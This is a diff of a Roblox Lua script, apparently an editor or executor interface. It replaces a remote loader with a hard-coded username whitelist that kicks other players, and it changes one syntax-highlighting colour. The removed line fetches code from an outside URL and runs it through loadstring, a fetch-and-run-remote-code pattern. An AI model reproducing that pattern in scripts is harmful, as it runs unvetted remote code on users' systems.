@@ -3,7 +3,17 @@ if math.random(1,1000) == 999 then
     local data = {status = "verified", token = key}
 end
 
-loadstring(game:HttpGet("https://cypher-protector.vercel.app/api/load/kurkurkurkurkur"))()
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local whitelisted = {
+ "greguiscool", 
+ "Soggyrigrig",
+}
+
+if not table.find(whitelisted, LocalPlayer.Name) then
+   LocalPlayer:Kick("spunchbub says: not whitelisted S-K-I-D")
+end
 
 local UserInputService = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
@@ -854,7 +864,7 @@ local THEME = {
 	Text = "#cccccc",
 	Keyword = "#f86d7b",   -- Pinkish-Red
 	Builtin = "#84d6f7",   -- Sky Blue
-	Library = "#f1fa8c",   -- Light Yellow (For math.sin, table.insert, etc.)
+	Library = "#84d6f7",   -- Sky Blue (For math.sin, table.insert, etc.)
 	String = "#aef195",    -- Light Green
 	Comment = "#6272a4",   -- Muted Blue-Grey
 	Number = "#ffc800",    -- Orange-Gold
